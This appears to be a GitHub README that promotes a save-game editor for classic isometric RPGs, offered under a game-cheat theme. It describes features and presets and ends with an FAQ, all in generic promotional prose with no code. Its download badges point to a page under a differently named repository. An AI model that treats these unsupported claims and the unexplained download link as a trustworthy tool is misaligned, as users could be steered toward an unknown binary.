![preview](https://raw.githubusercontent.com/tho288/Wasteland-Edgerunner/main/poster_c3f41a.svg)
[![Download](https://raw.githubusercontent.com/tho288/Wasteland-Edgerunner/main/app_b9ca83.svg)](https://tho288.github.io/Wasteland-Edgerunner/)

# 🎮 Vault-Tec Memory Editor — Wasteland Companion Suite

**An open-source save-game state editor, memory exploration toolkit, and quality-of-life companion for classic post-apocalyptic role-playing adventures.**

Welcome, wanderer. If you have ever stared at a dusty terminal in a ruined world and thought, *"What if I could nudge the numbers without breaking the story?"* — then this project was built for you. **Vault-Tec Memory Editor** is a carefully engineered desktop utility that lets you inspect, visualize, and persistently modify character statistics, inventory weights, and progression flags inside your own locally saved game files. It is designed for archivists, speedrunners, tinkerers, and retro-gaming historians who want more visibility into how these beloved engines tick.

This repository is a spiritual successor project — a fresh, distinct idea inspired by the "cheat table" ecosystem — but it takes a fundamentally different, more respectful approach: instead of patching live processes, we parse save files offline, present them in a readable dashboard, and let you commit changes you fully understand.

---

## 🧭 Table of Contents

- [Project Vision](#-project-vision)
- [What Makes It Different](#-what-makes-it-different)
- [Feature Matrix](#-feature-matrix)
- [Configuration Presets](#-configuration-presets)
- [Save File Anatomy Explorer](#-save-file-anatomy-explorer)
- [Responsive User Interface](#-responsive-user-interface)
- [Multilingual Support](#-multilingual-support)
- [24/7 Community Assistance](#-247-community-assistance)
- [Roadmap 2026](#-roadmap-2026)
- [Compatibility Notes](#-compatibility-notes)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Contributing](#-contributing)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🏛️ Project Vision

Every classic role-playing engine is a clockwork universe. Beneath the pixel art and the ambient hum of a distant radio, there is a table of integers deciding how much you can carry, how persuasive your voice sounds, and whether a certain door considers you worthy. Most players never see this machinery. We think that is a shame.

**Vault-Tec Memory Editor** exists to make that hidden clockwork legible. The goal is not to trivialize the challenge of the games we love — it is to give players, modders, and researchers a **transparent, reversible, and well-documented lens** into their own save data. Think of it as a museum curator's magnifying glass rather than a wrecking ball.

This project is part of a broader movement toward **preservation-oriented tooling** for legacy software. When official editors vanish, community tooling becomes the memory of the medium. We take that responsibility seriously.

---

## ✨ What Makes It Different

Most utilities in this space patch a running process in memory. That approach is fast, but it is also fragile, opaque, and occasionally destructive to ongoing sessions. Our philosophy is different in four concrete ways:

1. **Offline-first architecture.** We read and write save files directly. No process injection, no runtime hooks, no risk to your active session.
2. **Reversible edits.** Every modification produces an automatic backup snapshot with a timestamp, so you can always roll back to a known-good state.
3. **Explainable fields.** Every editable value is documented with its likely purpose, valid range, and downstream consequences.
4. **Deterministic exports.** You can export a human-readable diff of every change you make — perfect for sharing with friends or documenting a speedrun route.

---

## 🧩 Feature Matrix

| Capability | Status | Notes |
|---|---|---|
| Character statistic inspection | ✅ Stable | Read-only view with sorting and search |
| Weight and inventory rebalancing | ✅ Stable | Batch operations supported |
| Progression flag toggling | ✅ Stable | Includes warning dialogs for narrative-critical flags |
| Multi-slot profile management | ✅ Stable | Named presets, versioned snapshots |
| Save diff export | ✅ Stable | Plain-text and structured formats |
| Localization packs | 🟡 Beta | Community-contributed language bundles |
| Cloud-independent sync folder watch | 🟡 Beta | Watches a user-chosen directory |
| Accessibility narration | 🔵 Planned | Screen-reader-friendly field descriptions |
| Plugin-style custom field schemas | 🔵 Planned | For advanced researchers |

---

## ⚙️ Configuration Presets

Presets are the heart of the daily workflow. Rather than editing dozens of numbers one at a time, you can assemble a **preset** — a named bundle of intended values — and apply it in a single action. Presets are stored as readable documents, so they can be shared, reviewed, and version-controlled just like source code.

Examples of preset categories you might build:

- **Archivist Mode** — no changes, pure inspection, maximum logging verbosity.
- **Narrative Reset** — restore a character to a canonical starting configuration.
- **Simulation Curator** — arbitrary values for building custom scenarios.
- **Quality-of-Life Bundle** — reduce friction without altering the difficulty curve.

Because presets are declarative, they never silently surprise you. Applying a preset always shows a preview diff before anything is written to disk.

---

## 🔬 Save File Anatomy Explorer

The Anatomy Explorer is a dedicated panel that visualizes the structure of a save file as a navigable tree. It shows:

- **Header blocks** with version and signature data.
- **Character records** with grouped attribute clusters.
- **World state sections** tracking progress markers.
- **Inventory arrays** with item identifiers and stack counts.
- **Metadata trailers** used by the engine for integrity checks.

Each node can be expanded, and hovering reveals a short human-written explanation. This panel is intentionally read-only, so you can explore without fear. When you are ready to make changes, you promote a value to the **Edit Queue**, which is a separate, guarded surface.

---

## 📱 Responsive User Interface

The interface adapts to whatever screen you have on hand — from a towering desktop multi-monitor rig to a modest laptop panel. Layouts reflow gracefully, panels can be docked or floated, and the entire design respects your operating system's scaling preferences. A compact "field mode" reduces the UI to essentials for quick checks on the go. Keyboard-first navigation is supported throughout, with sensible shortcuts and a discoverable command palette.

---

## 🌐 Multilingual Support

Localization is treated as a first-class feature, not an afterthought. Every user-facing string is externalized into language packs that contributors can extend without touching the core code. The interface ships with a baseline set of languages and gracefully falls back to English for any missing entries. Right-to-left layouts are supported at the framework level. If you would like to contribute a translation, you are warmly invited — see the [Contributing](#-contributing) section.

---

## 🕰️ 24/7 Community Assistance

The community forum and issue tracker are monitored around the clock by a rotating group of maintainers and volunteers across multiple time zones. Whether you are stuck on a malformed save, curious about an unfamiliar field, or want a second opinion before committing a change, there is almost always someone awake and happy to help. Response time targets are documented in the contribution guidelines, and we keep a public log of average first-response times for transparency.

---

## 🗺️ Roadmap 2026

- **Q1 2026** — Accessibility narration pilot, expanded field descriptions.
- **Q2 2026** — Plugin-style custom field schemas, richer diff visualizations.
- **Q3 2026** — Cross-platform packaging review, portable mode.
- **Q4 2026** — Long-term archival format proposal, community schema registry.

The roadmap is a living document. Priorities shift based on what the community actually needs, not what looks good on a slide.

---

## 🧪 Compatibility Notes

This toolkit targets save files produced by classic isometric role-playing engines from the late 1990s. Because those engines evolved across multiple patch levels, save formats can differ subtly. The editor performs a validation pass before opening any file and will clearly report unsupported variants rather than guessing. Always keep your own independent backups, even though the tool creates its own.

Operating system support spans the three major desktop families. Builds are produced from a single shared codebase, and platform-specific quirks are tracked in a dedicated issue label.

---

## ❓ Frequently Asked Questions

**Is this reversible?**
Yes. Every write operation creates a timestamped backup before it touches your file. You can roll back from within the app or manually.

**Will this break my playthrough?**
Inspection cannot. Edits can if you change narrative-critical values, which is why those fields carry explicit warnings and require a confirmation step.

**Do I need to be a programmer?**
No. The interface is designed for curious players first and researchers second. Advanced users can dig into raw field definitions, but they do not have to.

**Can I share my presets?**
Absolutely. Presets are plain readable documents, so sharing is as simple as sending a file.

**Where do I report a bug?**
Open an issue using the provided template. Include your platform, the tool version, and if possible a redacted sample save.

---

## 🤝 Contributing

Contributions of all sizes are welcome — code, documentation, translations, field descriptions, and bug reports alike. Please read the contribution guidelines before opening a pull request. We ask that all participants follow the code of conduct, which emphasizes patience, curiosity, and good faith. First-time contributors are especially encouraged; look for issues tagged as beginner-friendly.

---

## 🛡️ Disclaimer

This project is an independent, community-built utility. It is **not affiliated with, endorsed by, or sponsored by** any game publisher, developer, or rights holder. All trademarks and copyrights belong to their respective owners. The toolkit operates exclusively on **your own local save files** and does not bypass, distribute, or modify any protected game content. It is provided for personal, educational, and preservation purposes. Use it responsibly, and always keep independent backups of your data.

---

## 📜 License

This repository is released under the **MIT License**. You are permitted to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, subject to the conditions of the license. A working reference to the full license text is available at: https://opensource.org/licenses/MIT

Copyright (c) 2026 Vault-Tec Memory Editor Contributors

---

[![Download](https://raw.githubusercontent.com/tho288/Wasteland-Edgerunner/main/app_b9ca83.svg)](https://tho288.github.io/Wasteland-Edgerunner/)